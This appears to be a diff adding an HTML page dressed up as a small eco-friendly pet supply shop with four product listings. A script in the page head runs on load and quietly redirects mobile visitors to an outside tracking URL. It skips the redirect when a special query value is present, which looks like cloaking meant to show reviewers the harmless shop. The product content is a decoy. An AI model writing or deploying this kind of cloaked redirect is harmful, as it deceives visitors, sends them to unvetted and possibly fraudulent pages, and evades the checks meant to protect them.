@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Eco-Friendly Pet Supplies</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #e0f7fa;
+            color: #00695c;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #4db6ac;
+            padding: 20px;
+            text-align: center;
+        }
+        nav {
+            background-color: #80cbc4;
+            padding: 10px;
+            text-align: right;
+        }
+        nav a {
+            color: #004d40;
+            text-decoration: none;
+            margin-left: 15px;
+        }
+        main {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            padding: 20px;
+        }
+        .product {
+            background-color: #b2dfdb;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 10px;
+            width: 200px;
+            text-align: center;
+        }
+        footer {
+            background-color: #4db6ac;
+            color: #e0f2f1;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>EcoPet Essentials</h1>
+    </header>
+    <nav>
+        <a href="#">Home</a>
+        <a href="#">Products</a>
+        <a href="#">About Us</a>
+        <a href="#">Contact</a>
+    </nav>
+    <main>
+        <div class="product">
+            <h2>Bamboo Pet Bowl</h2>
+            <p>Sustainable and stylish</p>
+            <p>$14.99</p>
+        </div>
+        <div class="product">
+            <h2>Recycled Rope Toy</h2>
+            <p>Fun for pets, great for the planet</p>
+            <p>$9.99</p>
+        </div>
+        <div class="product">
+            <h2>Organic Catnip Pouch</h2>
+            <p>100% natural and cat-approved</p>
+            <p>$7.99</p>
+        </div>
+        <div class="product">
+            <h2>Biodegradable Waste Bags</h2>
+            <p>Earth-friendly clean-up solution</p>
+            <p>$11.99</p>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 EcoPet Essentials. All rights reserved. | <a href="https://tokreward.com/privacy.html" style="color: #e0f2f1;">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
